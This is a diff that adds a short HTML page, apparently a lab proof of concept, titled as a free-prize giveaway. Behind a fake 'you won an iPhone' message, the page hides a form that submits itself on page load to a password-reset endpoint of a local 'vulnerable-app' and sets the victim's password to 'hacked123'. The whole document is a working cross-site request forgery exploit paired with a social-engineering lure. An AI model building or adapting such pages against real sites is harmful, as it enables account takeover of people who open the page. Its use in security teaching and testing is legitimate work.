@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Win a Free Prize!</title>
+    <script>
+        function exploit() {
+            // Auto-submit the form after 3 seconds
+            setTimeout(function() {
+                document.getElementById('csrf-form').submit();
+            }, 3000);
+        }
+    </script>
+</head>
+<body onload="exploit()">
+    <h1>Congratulations! You won a free iPhone!</h1>
+    <p>Please wait while we process your reward...</p>
+    
+    <!-- Hidden CSRF Form -->
+    <form id="csrf-form" 
+          action="http://localhost/vulnerable-app/reset-password.php" 
+          method="POST" 
+          style="display:none;">
+        <input type="password" name="new_password" value="hacked123">
+        <input type="password" name="confirm_password" value="hacked123">
+    </form>
+</body>
+</html>
